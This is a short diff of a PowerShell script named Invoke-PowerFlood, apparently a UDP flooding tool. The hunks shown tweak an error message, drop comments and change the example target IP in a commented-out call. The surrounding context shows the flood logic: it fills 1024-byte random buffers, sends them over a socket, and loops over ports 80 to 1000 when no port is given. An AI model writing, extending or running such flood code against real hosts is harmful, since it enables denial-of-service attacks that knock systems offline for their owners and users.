@@ -14,8 +14,6 @@ function Invoke-PowerFlood {
     $port = -1
  
     )
- 
-    ## Check IP variable
      function udpEngine {
  
     [CmdletBinding()] Param(
@@ -49,7 +47,6 @@ function Invoke-PowerFlood {
         $Enc = [System.Text.Encoding]::ASCII
         $Message = New-Object Byte[] 1024
         (New-Object Random).NextBytes($Message);
-        #$Buffer  = $Enc.GetBytes( $Message )  
         # Send the buffer   
         $Sent   = $Sock.Send( $Message )  
      
@@ -61,6 +58,6 @@ function Invoke-PowerFlood {
         if ($port -eq -1) {foreach ( $port in 80..1000 ) { udpEngine $targetIP $port }} else
         {udpEngine $targetIP $port}
  
-    } else { write-output "[!] target IP not specified, required!" }
+    } else { write-host -ForegroundColor "Red" "[!] target IP not specified!" }
 }
-#Invoke-PowerFlood 192.168.1.182 8 53
+#Invoke-PowerFlood 192.168.1.191 8 53
